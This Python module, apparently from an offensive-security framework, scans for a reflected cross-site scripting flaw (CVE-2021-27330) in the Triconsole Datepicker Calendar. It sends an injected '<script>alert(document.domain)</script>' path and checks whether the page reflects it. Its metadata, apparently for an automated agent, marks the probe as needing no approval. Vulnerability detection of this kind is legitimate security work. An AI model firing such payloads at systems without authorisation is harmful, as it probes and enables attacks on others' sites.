#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Triconsole Datepicker Calendar before 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Triconsole Datepicker Calendar <3.77 - Cross-Site Scripting Detection',
        'description': 'Triconsole Datepicker Calendar before 3.77 contains a cross-site scripting vulnerability in calendar_form.php. Attackers can read authentication cookies that are still active, which can be used to perform further attacks such as reading browser history, directory listings, and file contents.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'xss', 'edb', 'triconsole', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/49597',
            'http://www.triconsole.com/',
            'http://www.triconsole.com/php/calendar_datepicker.php',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-27330',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-27330',
    }

    def run(self):
        r = self.http_request(method="GET", path='/calendar/calendar_form.php/"><script>alert(document.domain)</script>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<script>alert(document.domain)</script>', '<title>TriConsole.com - PHP Calendar Date Picker</title>',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Triconsole Datepicker Calendar <3.77 - Cross-Site Scripting detected",
                path='/calendar/calendar_form.php/"><script>alert(document.domain)</script>',
            )
            return True
        return False

